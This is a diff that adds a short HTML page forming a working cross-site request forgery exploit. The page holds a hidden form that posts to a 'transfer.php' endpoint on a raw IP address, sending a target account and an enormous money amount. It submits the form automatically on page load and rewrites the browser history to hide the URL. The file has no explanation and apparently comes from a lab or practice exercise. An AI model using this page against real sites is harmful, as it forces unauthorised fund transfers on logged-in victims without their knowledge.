@@ -1,0 +1,11 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://173.82.206.142:8005/transfer.php" method="POST">
+      <input type="hidden" name="target" value="1" />
+      <input type="hidden" name="money" value="1000000000000000000000" />
+      <input type="hidden" name="messages" value="11" />
+    </form>
+	<script>document.forms[0].submit();</script>
+  </body>
+</html>
